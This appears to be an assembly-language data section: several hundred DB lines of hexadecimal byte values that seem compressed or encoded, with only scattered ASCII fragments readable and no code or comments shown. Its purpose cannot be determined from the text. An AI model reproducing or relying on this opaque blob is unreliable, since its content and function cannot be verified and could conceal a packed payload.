   DB 012H,035H,024H,036H,04AH,037H,01CH,06AH,004H,019H,03AH,019H,03BH,091H,009H
   DB 03CH,022H,03DH,044H,03EH,03FH,089H,040H,04DH,024H,05FH,001H,0EEH,05AH,0E1H
   DB 0DCH,0ADH,005H,0D2H,010H,05AH,045H,0F2H,097H,038H,072H,026H,079H,01CH,0DAH
   DB 0BCH,001H,04DH,04CH,02DH,029H,01CH,010H,069H,002H,0ECH,005H,001H,0B2H,04CH
   DB 064H,044H,027H,006H,009H,066H,04CH,052H,0C0H,01FH,05AH,0E2H,0AAH,053H,01FH
   DB 077H,012H,040H,0B3H,092H,0AEH,022H,01AH,024H,084H,020H,017H,009H,010H,099H
   DB 064H,054H,06AH,082H,0CEH,062H,0D7H,004H,0F2H,065H,0DBH,0C0H,0B3H,00EH,086H
   DB 0E0H,0ADH,0D0H,029H,034H,05CH,06BH,008H,009H,07CH,05EH,098H,086H,006H,0F0H
   DB 057H,0B7H,044H,0ADH,05BH,064H,0A2H,09FH,0A5H,060H,001H,09CH,02CH,047H,0E0H
   DB 0C4H,0CCH,063H,0C8H,009H,0D0H,08AH,0B1H,064H,040H,05DH,0D8H,030H,0DCH,002H
   DB 058H,001H,034H,095H,080H,0A8H,0F8H,029H,055H,01AH,0D9H,0D8H,01EH,01CH,08CH
   DB 0CAH,078H,053H,076H,0ADH,0D0H,060H,091H,07CH,099H,049H,0FDH,066H,06EH,0CAH
   DB 041H,050H,088H,069H,0D6H,019H,0E9H,078H,029H,010H,0CCH,0F9H,028H,057H,080H
   DB 02BH,03AH,0BCH,047H,000H,053H,052H,098H,051H,08AH,005H,0FAH,056H,0A5H,090H
   DB 0F0H,0C8H,008H,08CH,070H,038H,0A2H,080H,04DH,080H,007H,00CH,083H,046H,004H
   DB 028H,0DCH,03CH,0BCH,093H,034H,0A9H,001H,065H,080H,00AH,004H,018H,080H,0E4H
   DB 0CDH,006H,0A0H,04DH,0ACH,0B7H,0C5H,09AH,038H,053H,034H,023H,0C0H,0CAH,001H
   DB 0FAH,090H,0F0H,050H,029H,043H,047H,036H,00EH,0D4H,002H,0BBH,09CH,094H,00BH
   DB 030H,0ECH,080H,026H,044H,003H,078H,061H,0C0H,0F9H,067H,052H,008H,056H,049H
   DB 0F8H,028H,04DH,01CH,09CH,018H,042H,014H,041H,036H,0BCH,030H,051H,065H,060H
   DB 058H,028H,0B8H,0A8H,094H,0F5H,001H,099H,04CH,0D1H,001H,022H,0FCH,0CAH,007H
   DB 080H,07EH,010H,040H,06CH,00CH,0C2H,0A0H,058H,060H,01AH,0B4H,0C8H,0B7H,0E7H
   DB 01FH,0EAH,001H,071H,00DH,0C2H,03CH,0ADH,0E8H,026H,080H,044H,009H,0DDH,0D4H
   DB 033H,000H,0A9H,041H,001H,093H,006H,02CH,000H,0ABH,023H,008H,0F9H,010H,01FH
   DB 0D2H,024H,0E8H,0B7H,000H,04AH,052H,068H,0DFH,000H,05AH,093H,044H,021H,022H
   DB 009H,022H,044H,023H,024H,08AH,059H,000H,0E4H,028H,0B6H,004H,04BH,06FH,000H
   DB 04BH,052H,0A4H,0CFH,000H,0C9H,038H,06CH,0A4H,096H,000H,0DEH,091H,0FCH,011H
   DB 042H,022H,043H,044H,044H,045H,0BBH,0B5H,099H,047H,009H,048H,012H,049H,024H
   DB 04AH,04AH,04BH,0C4H,0E4H,04DH,048H,04EH,091H,04FH,022H,050H,044H,051H,052H
   DB 089H,053H,023H,0CCH,064H,002H,055H,0B3H,078H,088H,058H,091H,059H,022H,05AH
   DB 044H,05BH,05CH,0A6H,01CH,04BH,05EH,02BH,078H,0B8H,001H,072H,016H,0E1H,0D1H
   DB 0B6H,035H,03BH,065H,046H,033H,043H,0DAH,00CH,067H,04DH,0D2H,0E5H,05DH,044H
   DB 003H,0DCH,049H,007H,094H,019H,073H,023H,0C0H,008H,091H,078H,031H,0DEH,009H
   DB 0F7H,002H,066H,053H,056H,06AH,07BH,088H,094H,01EH,072H,096H,0A2H,012H,064H
   DB 00FH,09DH,0E9H,05FH,008H,05FH,06FH,094H,03BH,033H,013H,0E1H,0D6H,085H,021H
   DB 004H,0DFH,004H,05AH,0C7H,07EH,0E1H,048H,008H,00CH,0E1H,022H,068H,0AAH,08BH
   DB 028H,018H,068H,053H,04CH,0ACH,09AH,0A3H,0EBH,0D2H,010H,0B9H,00AH,094H,04AH
   DB 0AEH,014H,002H,03CH,00AH,092H,029H,08DH,093H,00AH,04EH,04BH,0E4H,07BH,073H
   DB 0EEH,019H,032H,009H,039H,013H,036H,082H,02DH,0DEH,002H,052H,09CH,00AH,057H
   DB 043H,014H,0D4H,002H,0E3H,034H,02CH,071H,07DH,07EH,00EH,0C9H,0EDH,0F4H,086H
   DB 02CH,0DFH,0E1H,044H,078H,059H,0CEH,080H,010H,002H,081H,0FEH,0ADH,0A7H,0B8H
   DB 05EH,0F3H,0DDH,092H,0CFH,0D7H,02CH,01DH,0A3H,0E0H,00CH,011H,018H,002H,0A7H
   DB 018H,02BH,00CH,0CDH,029H,026H,06FH,0CBH,00CH,099H,039H,094H,028H,059H,0B5H
   DB 06DH,034H,07BH,09BH,0A5H,029H,030H,052H,05AH,097H,014H,027H,017H,0F5H,0ABH
   DB 024H,072H,0B1H,001H,002H,07BH,022H,09BH,04DH,0CAH,0E8H,09CH,02CH,0D2H,00CH
   DB 039H,077H,05EH,001H,0E0H,0FEH,0CAH,001H,0A8H,0EEH,022H,081H,04EH,008H,0A8H
   DB 039H,0B6H,019H,04CH,004H,0CAH,0A6H,019H,04EH,00AH,076H,07CH,019H,04AH,00CH
   DB 065H,005H,00AH,00CH,01EH,0FCH,0EAH,00CH,017H,03AH,075H,05DH,062H,030H,090H
   DB 039H,024H,012H,0A0H,096H,018H,042H,0C8H,029H,080H,060H,011H,0D8H,078H,089H
   DB 002H,012H,0E0H,010H,080H,009H,093H,014H,06AH,0DCH,011H,0F0H,008H,08FH,004H
   DB 030H,067H,0C1H,001H,01AH,002H,070H,012H,0AFH,0A7H,080H,01CH,0A6H,028H,0FCH
   DB 0BFH,0B3H,002H,03FH,01CH,022H,052H,012H,07AH,086H,044H,0F7H,024H,0FCH,0F6H
   DB 0BFH,006H,09FH,001H,015H,07AH,026H,070H,021H,064H,028H,009H,02AH,04FH,02CH
   DB 08DH,08BH,040H,055H,018H,026H,01CH,04CH,0ACH,020H,045H,025H,0B2H,024H,014H
   DB 02EH,027H,030H,0ECH,08EH,0AEH,0BAH,00CH,006H,027H,046H,041H,042H,049H,011H
   DB 04AH,094H,00CH,05DH,093H,0F9H,067H,0BFH,0C4H,073H,057H,053H,060H,035H,0C0H
   DB 05CH,0FBH,026H,0C7H,058H,04CH,00BH,0C9H,014H,03AH,05CH,02EH,00FH,02EH,053H
   DB 052H,05CH,014H,01DH,076H,0F0H,042H,040H,032H,0DDH,0B5H,038H,02AH,02EH,016H
   DB 0CAH,01CH,034H,0A4H,0AFH,07AH,011H,070H,074H,069H,09BH,0A9H,011H,04AH,06CH
   DB 052H,0F0H,018H,0B9H,0F6H,010H,087H,011H,001H,0B0H,0B1H,003H,041H,074H,088H
   DB 072H,069H,062H,060H,075H,04AH,065H,020H,056H,042H,00CH,05FH,04EH,061H,06DH
   DB 013H,03DH,0F6H,022H,027H,054H,068H,000H,078H,044H,06FH,063H,075H,07FH,06DH
   DB 01FH,06EH,010H,074H,0CEH,00DH,00AH,020H,08CH,042H,061H,073H,001H,076H,002H
   DB 039H,030H,07BH,067H,002H,032H,063H,050H,039H,0CAH,036H,0C1H,04CH,010H,0F8H
   DB 003H,008H,05CH,043H,0C8H,003H,014H,002H,012H,001H,024H,00EH,02CH,034H,036H
   DB 07DH,0E0H,00DH,07CH,043H,072H,065H,039H,061H,074H,00FH,062H,082H,06CH,087H
   DB 086H,046H,09EH,0AFH,073H,0A4H,00CH,05EH,086H,0AEH,026H,078H,064H,07CH,063H
   DB 0FCH,089H,090H,0F8H,079H,049H,0E0H,08BH,07FH,054H,000H,075H,00DH,022H,040H
   DB 045H,078H,070H,06FH,0C7H,03CH,014H,01CH,0ECH,0E2H,06DH,0F5H,09EH,038H,074H
   DB 0CFH,044H,030H,0D4H,08AH,007H,076H,002H,024H,011H,0A0H,043H,075H,0C0H,073H
   DB 01FH,074H,06FH,06DH,042H,07AH,004H,088H,003H,087H,0D0H,053H,0E1H,062H,020H
   DB 041H,043H,0A1H,06FH,086H,064H,0C5H,08AH,028H,029H,01CH,08BH,007H,04FH,06EH
   DB 020H,0C7H,072H,017H,06FH,03AH,0E9H,01DH,047H,05DH,054H,0F1H,018H,052H,004H
   DB 0C8H,04FH,080H,038H,055H,050H,097H,04CH,049H,0F0H,015H,054H,0EBH,0F0H,04EH
   DB 02EH,07AH,044H,0DBH,06EH,01EH,0E3H,059H,0F7H,040H,045H,038H,052H,054H,0F7H
   DB 0C0H,055H,005H,01EH,034H,008H,011H,0D9H,04EH,03CH,042H,09DH,022H,043H,07CH
   DB 073H,0DEH,068H,01FH,04BH,0DCH,059H,006H,012H,057H,044H,064H,01DH,01BH,001H
   DB 00AH,0B0H,0AAH,046H,080H,02DH,03AH,049H,009H,072H,03CH,031H,020H,003H,02FH
   DB 04EH,04FH,052H,04DH,00EH,0E4H,04CH,054H,045H,0DFH,01AH,029H,00AH,042H,050H
   DB 041H,018H,050H,09FH,0C0H,04AH,08FH,004H,043H,0ADH,080H,008H,0E5H,04DH,0F7H
   DB 0E5H,0C6H,07AH,096H,0CDH,0AAH,02EH,018H,0B6H,0B0H,010H,076H,001H,049H,066H
   DB 020H,011H,0A2H,017H,028H,0DDH,029H,0C0H,019H,044H,0D4H,068H,09EH,075H,065H
   DB 055H,0CAH,02EH,018H,08CH,04DH,053H,028H,01CH,031H,02CH,020H,0D8H,002H,032H
   DB 03BH,022H,091H,0E4H,09DH,040H,0FFH,048H,059H,048H,051H,007H,0C9H,038H,04EH
   DB 080H,063H,078H,074H,0E3H,049H,024H,078H,063H,0E0H,03BH,014H,0C0H,026H,0A3H
   DB 07CH,009H,028H,022H,043H,004H,002H,0DBH,0C1H,013H,044H,0D9H,0F6H,003H,00FH
   DB 040H,04FH,04CH,00FH,023H,041H,056H,045H,073H,042H,00EH,001H,051H,03AH,080H
   DB 080H,06EH,064H,020H,040H,05BH,0FBH,0C3H,0F6H,020H,09DH,079H,093H,0F4H,01AH
   DB 0CCH,061H,05EH,00DH,042H,0F0H,055H,069H,090H,009H,09EH,009H,0E4H,03EH,0DFH
   DB 038H,0C0H,005H,0B2H,00FH,077H,02CH,04DH,02AH,06DH,025H,047H,034H,048H,04DH
   DB 034H,06DH,025H,046H,03DH,048H,0C4H,023H,0F0H,070H,02EH,0D9H,01DH,010H,039H
   DB 0A5H,008H,056H,090H,051H,052H,03CH,00EH,027H,055H,084H,032H,056H,0F0H,01EH
   DB 053H,09AH,0A3H,06CH,044H,0CDH,00CH,050H,0D9H,031H,020H,047H,0B3H,00DH,044H
   DB 04DH,029H,009H,053H,02CH,079H,043H,099H,011H,04DH,025H,04EH,057H,020H,0ACH
   DB 035H,043H,0ABH,038H,0F6H,009H,0A1H,0AAH,054H,0B2H,045H,014H,048H,0A6H,038H
   DB 045H,0B1H,05BH,05CH,065H,0B8H,064H,008H,0ABH,016H,03CH,036H,017H,034H,066H
   DB 04CH,005H,023H,02DH,0B6H,054H,092H,075H,0AAH,023H,04AH,020H,078H,045H,0D9H
   DB 01DH,024H,063H,097H,019H,046H,089H,0CCH,0E3H,036H,069H,070H,005H,03CH,053H
   DB 05FH,042H,078H,0AEH,0A8H,06CH,04AH,0C1H,0F4H,054H,0B9H,0F1H,0D6H,04AH,01AH
   DB 09AH,080H,0E2H,01BH,027H,00CH,01AH,00CH,045H,064H,049H,098H,072H,04FH,071H
   DB 071H,008H,05AH,080H,0F2H,04CH,022H,07CH,002H,032H,0BCH,0F6H,070H,077H,053H
   DB 06DH,080H,0FCH,014H,08DH,079H,056H,06DH,0D8H,09AH,003H,04DH,076H,0FAH,0D1H
   DB 06FH,0E1H,002H,001H,006H,079H,0A4H,094H,080H,0EAH,022H,057H,023H,051H,001H
   DB 026H,016H,0A5H,047H,0D8H,014H,073H,028H,0F2H,020H,0C5H,03AH,0E9H,0E9H,082H
   DB 035H,067H,03AH,0ECH,038H,08EH,095H,0E2H,0C8H,0CDH,03EH,0A5H,074H,0CEH,05DH
   DB 0E9H,05DH,03EH,0DCH,070H,053H,067H,057H,029H,052H,005H,044H,059H,07EH,014H
   DB 04CH,0C1H,042H,0C1H,023H,04BH,048H,0D2H,0F7H,010H,07AH,0AEH,0A8H,0A1H,05AH
   DB 062H,0C1H,06AH,02DH,067H,09FH,0B6H,075H,068H,0D5H,020H,08EH,04EH,09AH,02AH
   DB 050H,001H,0B8H,0E1H,073H,068H,0A3H,033H,087H,0E8H,0FDH,091H,032H,0DDH,021H
   DB 065H,057H,0D3H,01CH,04EH,082H,044H,02FH,057H,036H,02CH,008H,044H,059H,054H
   DB 0E0H,045H,0E0H,04DH,0ABH,00EH,0D5H,054H,01CH,0A8H,02AH,045H,03CH,0FDH,05DH
   DB 0ECH,048H,012H,020H,095H,0D9H,075H,049H,073H,0CEH,06AH,001H,051H,0E0H,04BH
   DB 0C6H,064H,054H,046H,092H,0EAH,031H,0ACH,08AH,008H,036H,097H,06CH,092H,070H
   DB 038H,04BH,035H,0B2H,0A6H,0E3H,039H,087H,0C8H,0F6H,0ADH,0C6H,072H,04AH,0B2H
   DB 0EEH,0AAH,0A1H,0A8H,073H,04DH,0C6H,092H,04CH,044H,03FH,0B2H,052H,028H,099H
   DB 018H,032H,023H,0B4H,0EDH,060H,003H,0E4H,0A5H,0EEH,0B3H,0BCH,035H,02AH,07DH
   DB 038H,0CCH,048H,037H,03AH,0D2H,0F8H,094H,0CEH,031H,01CH,0A3H,056H,0A5H,0EEH
   DB 0D2H,0B1H,0E8H,050H,029H,0C0H,09FH,029H,0F2H,079H,045H,0C1H,058H,00EH,0EDH
   DB 080H,002H,0E1H,02EH,045H,00DH,08FH,0E0H,01EH,01AH,010H,085H,000H,002H,060H
   DB 08CH,04DH,00BH,0B4H,0CBH,024H,01CH,016H,0E8H,06CH,032H,0E9H,0BCH,038H,0E1H
   DB 0DAH,066H,082H,055H,043H,0E8H,043H,0DCH,042H,024H,025H,041H,006H,066H,030H
   DB 009H,0FDH,023H,006H,04BH,017H,0DAH,02DH,006H,0B9H,038H,04DH,0B2H,0DCH,0A9H
   DB 018H,092H,032H,03FH,006H,04EH,03BH,022H,0D3H,08BH,002H,0D4H,008H,07AH,0AAH
   DB 018H,04AH,032H,0B6H,00EH,055H,04DH,028H,025H,0BEH,038H,006H,0E5H,0CAH,028H
   DB 0A5H,09AH,0E4H,0E4H,0BAH,093H,0E1H,003H,083H,004H,070H,00AH,05BH,006H,00CH
   DB 089H,008H,011H,00AH,0F9H,07DH,047H,0B4H,0A8H,062H,0D2H,0CBH,00EH,04BH,09BH
   DB 096H,0E4H,0A2H,0B6H,0E1H,094H,01EH,093H,02CH,018H,0B6H,030H,0A2H,00AH,040H
   DB 09CH,033H,036H,0F6H,064H,03BH,063H,039H,0F5H,0A8H,0A2H,02AH,044H,02AH,001H
   DB 011H,099H,027H,096H,01EH,067H,06AH,00AH,0DFH,004H,08EH,051H,001H,0C6H,0F0H
   DB 0DDH,097H,01FH,012H,0D3H,04FH,0E3H,0EDH,00AH,0BAH,0A8H,043H,000H,040H,09EH
   DB 021H,033H,0DBH,0D2H,011H,0BCH,009H,0A4H,044H,045H,053H,0E2H,07BH,065H,078H
   DB 028H,008H,05AH,060H,099H,0ABH,086H,002H,01BH,001H,027H,024H,0E0H,0F0H,0EBH
   DB 045H,00CH,080H,0A2H,003H,080H,014H,0DDH,01CH,070H,04CH,045H,06EH,064H,0B4H
   DB 047H,09FH,005H,0DBH,012H,01FH,084H,017H,0C9H,0ABH,064H,082H,005H,0ABH,020H
   DB 04AH,014H,089H,017H,03EH,05FH,00DH,02BH,011H,028H,020H,058H,05FH,03AH,053H
   DB 040H,05FH,05BH,0D5H,020H,029H,0CCH,002H,01FH,08CH,049H,066H,008H,085H,0AEH
   DB 01EH,05FH,04EH,019H,03AH,020H,08AH,05CH,01EH,04FH,040H,06EH,0B0H,0AEH,04BH
   DB 095H,00CH,02DH,00AH,0B3H,0A6H,02DH,0D7H,014H,0D6H,06EH,00CH,057H,0B4H,02DH
   DB 067H,0B2H,004H,01BH,0F4H,0A3H,086H,0B5H,06BH,010H,066H,0F6H,056H,00CH,042H
   DB 041H,0F7H,0E2H,012H,005H,0C0H,026H,069H,06EH,031H,036H,0C1H,053H,07EH,00BH
   DB 005H,033H,032H,007H,07FH,000H,01FH,04DH,061H,063H,0B3H,0B2H,081H,006H,0E6H
   DB 0FDH,098H,00BH,0DFH,0D8H,0A0H,00CH,073H,074H,07EH,064H,0F6H,065H,020H,093H
   DB 060H,05CH,007H,043H,02AH,053H,0BAH,00CH,06DH,073H,043H,00FH,01AH,00CH,064H
   DB 004H,0D6H,069H,0ADH,031H,0C3H,074H,03CH,09EH,024H,024H,009H,023H,0B5H,0E6H
   DB 080H,057H,05FH,045H,076H,0C9H,078H,075H,050H,0E0H,028H,018H,0D9H,040H,038H
   DB 04FH,066H,09FH,069H,063H,008H,015H,075H,0B1H,0C2H,0F3H,064H,03EH,0C0H,042H
   DB 031H,0D4H,012H,0CFH,01AH,008H,0B2H,0A5H,0E3H,02AH,046H,0E2H,0ECH,09CH,01CH
   DB 0A3H,0A5H,0D3H,052H,088H,04FH,051H,05BH,081H,00BH,071H,0F2H,02AH,024H,0D8H
   DB 0A8H,0D7H,086H,0A5H,02AH,022H,058H,00DH,0DDH,07EH,095H,03AH,0DBH,054H,0DAH
   DB 00CH,0F4H,0F6H,026H,00FH,0E1H,0E9H,04EH,02AH,074H,0D9H,0A8H,0D8H,086H,0EAH
   DB 0F3H,02AH,0B0H,0F3H,035H,057H,044H,055H,01EH,018H,00DH,0FCH,0D3H,020H,021H
   DB 039H,0F6H,08CH,0B4H,00EH,00EH,0E1H,02AH,052H,0DEH,0A2H,0DDH,06CH,08BH,00CH
   DB 071H,055H,0ACH,0AAH,0C2H,054H,0E2H,0C3H,043H,054H,0AAH,068H,0ADH,0CBH,01FH
   DB 02AH,024H,0E7H,0A8H,0E6H,084H,00AH,027H,097H,016H,00DH,020H,02AH,005H,0EAH
   DB 030H,076H,01AH,057H,016H,054H,0E5H,025H,044H,0E4H,028H,0E1H,01CH,01BH,0A3H
   DB 09DH,00AH,050H,053H,0BAH,0CEH,0DCH,0B6H,0C4H,06BH,0A0H,094H,069H,0C5H,0ABH
   DB 0C1H,084H,0A9H,0BEH,014H,092H,0D0H,0D9H,092H,028H,015H,06AH,0A9H,086H,002H
   DB 072H,060H,05BH,04FH,0CAH,014H,05AH,046H,0E7H,01CH,0C4H,001H,05DH,06EH,022H
   DB 07EH,094H,050H,066H,00CH,03FH,0CFH,00CH,00EH,088H,003H,09FH,011H,027H,0C5H
   DB 0C0H,0B2H,010H,00EH,051H,086H,016H,012H,0CEH,0D8H,096H,0ABH,06BH,0CCH,0DEH
   DB 006H,078H,0B2H,080H,018H,054H,004H,012H,030H,066H,02AH,0EEH,090H,04EH,00CH
   DB 070H,014H,006H,048H,062H,082H,0C3H,0EEH,064H,0E4H,004H,08EH,06BH,026H,01CH
   DB 080H,01EH,0C9H,004H,009H,024H,0BCH,05BH,00AH,040H,002H,014H,0DFH,043H,03DH
   DB 0ADH,0C1H,016H,007H,0EDH,06AH,0EFH,0E8H,008H,006H,012H,07BH,009H,0E6H,080H
   DB 094H,0F8H,06AH,0B8H,007H,04AH,00AH,03CH,0EEH,06FH,016H,049H,09EH,091H,045H
   DB 008H,030H,046H,03EH,0FAH,019H,0F5H,06EH,05FH,0CEH,078H,07EH,0BDH,090H,0E3H
   DB 028H,00DH,096H,07EH,00AH,025H,05CH,091H,019H,02AH,008H,047H,02FH,030H,068H
   DB 034H,0D8H,033H,0F1H,003H,008H,025H,0D6H,043H,084H,04DH,00EH,082H,03CH,012H
   DB 05EH,067H,044H,023H,0E1H,03FH,0E7H,0AEH,004H,09DH,009H,00DH,009H,0E7H,003H
   DB 080H,044H,04FH,0ABH,053H,073H,012H,075H,059H,092H,0D6H,0F1H,068H,028H,069H
   DB 020H,003H,09DH,032H,02EH,0EBH,008H,0B1H,042H,023H,0A5H,076H,0E8H,03CH,080H
   DB 06FH,0A3H,0A2H,0ABH,069H,0ADH,081H,00BH,05EH,011H,002H,016H,061H,07AH,080H
   DB 0D6H,069H,0BBH,021H,0DAH,00AH,0FDH,035H,0A8H,01FH,0C4H,028H,0C9H,0FDH,0C1H
   DB 045H,03CH,035H,08BH,0D0H,070H,03CH,00AH,07AH,080H,009H,070H,0F7H,038H,0E7H
   DB 026H,041H,031H,035H,031H,034H,061H,019H,087H,0DAH,02DH,042H,038H,0A7H,033H
   DB 05FH,09FH,049H,002H,044H,078H,002H,075H,039H,0FEH,034H,0E2H,0C0H,0E6H,035H
   DB 0DCH,024H,0FCH,007H,001H,048H,017H,046H,047H,004H,09DH,0D8H,030H,06DH,023H
   DB 038H,04DH,069H,04AH,0A9H,006H,0C3H,005H,002H,03DH,0A5H,087H,0C1H,071H,04FH
   DB 062H,06AH,038H,036H,063H,01EH,04CH,069H,0C8H,072H,061H,01CH,0E6H,079H,09CH
   DB 082H,003H,001H,01EH,050H,030H,082H,090H,087H,0E8H,013H,0EDH,0C5H,0ECH,044H
   DB 035H,05AH,032H,00AH,055H,037H,0ADH,01EH,02DH,08FH,042H,031H,07CH,081H,005H
   DB 050H,041H,034H,01DH,0D0H,080H,04AH,0EEH,05CH,04CH,090H,083H,03AH,045H,09DH
   DB 085H,028H,00EH,058H,0A7H,093H,0CAH,093H,070H,09EH,094H,0E0H,083H,041H,093H
   DB 043H,058H,078H,048H,0CEH,044H,0EFH,082H,004H,040H,075H,0E2H,0B2H,03DH,042H
   DB 080H,00AH,098H,0C0H,02BH,08EH,0C4H,02CH,01BH,032H,044H,046H,0A8H,0A4H,080H
   DB 026H,043H,02DH,035H,055H,042H,0C3H,047H,0B6H,0BEH,05EH,028H,0C0H,04CH,048H
   DB 0B5H,07FH,03FH,040H,078H,07FH,0E8H,077H,001H,034H,005H,0C0H,002H,032H,008H
   DB 055H,0ECH,052H,051H,0E9H,03CH,06BH,00DH,04FH,053H,020H,034H,0CEH,078H,064H
   DB 0F2H,047H,0E6H,041H,0B0H,018H,09EH,05DH,03AH,0D8H,06DH,06FH,01AH,013H,0C2H
   DB 040H,054H,08EH,0C0H,09DH,075H,01AH,080H,08BH,05CH,084H,001H,06AH,04DH,022H
   DB 0A7H,003H,030H,02EH,044H,04CH,08BH,048H,0F0H,083H,025H,020H,03DH,038H,014H
   DB 0FDH,079H,092H,013H,00FH,042H,0BDH,003H,017H,013H,011H,0C2H,0A8H,094H,01EH
   DB 019H,0F6H,0A8H,09DH,09EH,032H,0EEH,074H,012H,01AH,04EH,004H,002H,037H,018H
   DB 040H,033H,043H,08CH,083H,068H,0B2H,038H,070H,092H,028H,080H,08FH,0AEH,09CH
   DB 092H,013H,090H,080H,091H,040H,0B6H,01CH,026H,051H,0C0H,06FH,080H,048H,042H
   DB 001H,031H,0C2H,0C4H,03EH,0DFH,02DH,01EH,0D9H,01EH,0AFH,0E1H,028H,02CH,0FCH
   DB 01AH,096H,0F2H,02AH,07BH,022H,033H,008H,02BH,030H,010H,04CH,006H,0B0H,097H
   DB 069H,054H,07BH,07AH,00DH,04CH,0C1H,0FCH,049H,009H,044H,03DH,022H,07BH,001H
   DB 058H,039H,045H,034H,020H,010H,042H,092H,064H,048H,033H,0C5H,09DH,0E4H,06EH
   DB 02CH,0E0H,024H,069H,024H,0C5H,0A4H,0C4H,0C6H,030H,003H,04EH,07DH,0C5H,0E2H
   DB 062H,069H,03DH,09CH,076H,00AH,02FH,026H,048H,030H,001H,06DH,044H,03EH,00DH
   DB 01EH,065H,0A2H,036H,0F0H,067H,063H,048H,0DEH,0C7H,070H,043H,0D8H,025H,00AH
   DB 091H,069H,01BH,030H,027H,0F9H,04DH,047H,08EH,012H,046H,033H,040H,031H,037H
   DB 034H,038H,042H,078H,036H,0E9H,0EEH,09CH,004H,0A0H,064H,050H,042H,0CFH,040H
   DB 045H,0B4H,090H,073H,0A0H,095H,038H,041H,071H,037H,0E9H,0D9H,042H,0D7H,0CDH
   DB 026H,004H,03DH,033H,047H,043H,03AH,044H,0FFH,02FH,0EDH,035H,044H,042H,098H
   DB 046H,08FH,004H,0ADH,043H,02FH,089H,004H,05BH,048H,089H,058H,086H,047H,045H
   DB 0D0H,0A1H,092H,064H,0CDH,072H,0E5H,049H,0D8H,066H,06FH,06AH,05DH,02CH,09BH
   DB 058H,031H,03DH,06EH,07BH,0BEH,052H,00AH,0F9H,036H,0CCH,00DH,02DH,043H,068H
   DB 0D6H,0ADH,0E5H,00EH,0E9H,038H,0A8H,0CCH,0EFH,0CFH,03AH,041H,0F3H,01BH,0B2H
   DB 020H,03CH,010H,035H,093H,07DH,03BH,05DH,056H,02BH,0D1H,04DH,0B5H,02CH,00EH
   DB 001H,06BH,073H,070H,061H,063H,065H,0ABH,0A3H,0F9H,044H,03DH,081H,019H,02CH
   DB 020H,043H,004H,036H,0CBH,030H,069H,00AH,0B2H,0D8H,0C9H,04EH,05AH,0CFH,07EH
   DB 0E5H,018H,003H,02AH,003H,00AH,0BBH,0CCH,025H,05BH,0FCH,0E4H,01DH,055H,06DH
   DB 09DH,0CDH,020H,064H,006H,02AH,0F7H,045H,092H,0E2H,0B5H,04CH,078H,051H,00CH
   DB 0ADH,04FH,064H,016H,0A1H,00CH,02EH,059H,034H,0E6H,060H,0E6H,0F4H,039H,02EH
   DB 0B2H,071H,0E3H,0F6H,0B4H,0AAH,055H,049H,0DDH,094H,010H,09DH,0F3H,050H,0E9H
   DB 0DDH,0BEH,058H,0ACH,010H,04EH,031H,0F8H,000H,0BEH,06AH,090H,010H,0F4H,09DH
   DB 0D9H,0B8H,0F8H,036H,013H,0ADH,008H,011H,022H,0FDH,04AH,088H,0A7H,00EH,010H
   DB 0F9H,0A7H,010H,06DH,072H,0D9H,052H,07FH,00AH,0D3H,0DBH,068H,056H,0B5H,07BH
   DB 000H,0EAH,0C8H,054H,0A5H,0F8H,052H,0BDH,001H,0D0H,009H,02DH,039H,020H,013H
   DB 007H,050H,041H,047H,045H,077H,015H,09FH,065H,00DH,028H,02FH,002H,001H,041H
   DB 020H,071H,075H,065H,06DH,0D5H,069H,074H,008H,072H,0F0H,073H,0E2H,061H,0EBH
   DB 0ECH,070H,06FH,0CDH,00FH,03AH,032H,093H,00CH,075H,058H,0DBH,013H,054H,02EH
   DB 0D6H,00BH,046H,0BCH,063H,069H,034H,04CH,061H,0BCH,09EH,0D4H,02CH,010H,0A7H
   DB 026H,020H,008H,03BH,075H,064H,09AH,0E7H,0F5H,07AH,093H,016H,0D3H,0E3H,06FH
   DB 069H,0EEH,060H,055H,054H,048H,04FH,052H,0C1H,0F2H,009H,050H,0E1H,067H,094H
   DB 0BAH,061H,089H,0B3H,009H,036H,012H,044H,0A4H,013H,05CH,00DH,07CH,06DH,0EEH
   DB 09EH,060H,014H,02CH,0A9H,00AH,063H,0B3H,0F4H,04EH,068H,0F6H,01BH,017H,04FH
   DB 04EH,046H,00EH,090H,045H,0BEH,03AH,09AH,041H,04CH,035H,0E0H,02CH,069H,064H
   DB 0A2H,06BH,0E2H,0B3H,0B7H,04AH,02CH,059H,037H,042H,02AH,08BH,0DAH,091H,014H
   DB 06CH,05DH,0AFH,0FBH,07CH,0BAH,0B2H,0A4H,0ABH,0E9H,07CH,06AH,035H,052H,045H
   DB 06FH,065H,03BH,025H,019H,01EH,0F4H,03EH,0D3H,0B4H,086H,00DH,045H,050H,092H
   DB 00DH,092H,009H,069H,074H,0DEH,02BH,00BH,043H,049H,024H,068H,047H,02AH,03CH
   DB 01EH,053H,050H,0E9H,097H,09BH,04DH,024H,0DDH,05DH,084H,0F5H,098H,0A0H,0C5H
   DB 049H,096H,066H,03EH,0EAH,09EH,015H,053H,03DH,059H,049H,06AH,064H,014H,08BH
   DB 075H,069H,0A4H,01EH,061H,09FH,03DH,06CH,0D4H,066H,04CH,0CDH,05CH,041H,064H
   DB 0A9H,0D8H,00DH,0C3H,05CH,070H,014H,021H,04FH,062H,093H,02AH,067H,094H,074H
   DB 028H,05CH,029H,0B4H,07EH,0CEH,0E2H,053H,02DH,04FH,0E5H,06FH,00AH,084H,07AH
   DB 015H,043H,020H,053H,048H,08AH,028H,07FH,0CAH,015H,03AH,016H,0C5H,073H,035H
   DB 014H,01AH,0B3H,026H,04FH,025H,0AEH,09AH,018H,065H,019H,04EH,055H,050H,04DH
   DB 00FH,053H,0C9H,0BFH,051H,00DH,0EEH,0C0H,042H,033H,070H,04AH,031H,08AH,08BH
   DB 0ACH,037H,066H,043H,065H,066H,024H,028H,0EAH,064H,04AH,00CH,028H,0F7H,0FFH
   DB 045H,0B4H,038H,0ACH,053H,090H,0CFH,06FH,020H,05DH,0D2H,036H,05FH,0B4H,06CH
   DB 063H,054H,01DH,076H,0E9H,0B2H,045H,038H,055H,04AH,0C1H,078H,01BH,049H,0E7H
   DB 0B6H,024H,056H,017H,03EH,072H,049H,0C9H,05AH,055H,00AH,021H,0C4H,0EBH,078H
   DB 016H,0EBH,0E0H,032H,034H,0F6H,048H,080H,041H,053H,0A9H,015H,046H,0E0H,043H
   DB 02DH,0F4H,0CDH,055H,04DH,0EDH,0FCH,0DAH,06CH,031H,074H,069H,0A4H,020H,067H
   DB 09BH,078H,076H,07CH,050H,0C3H,0A2H,04CH,0CBH,04AH,054H,068H,074H,044H,042H
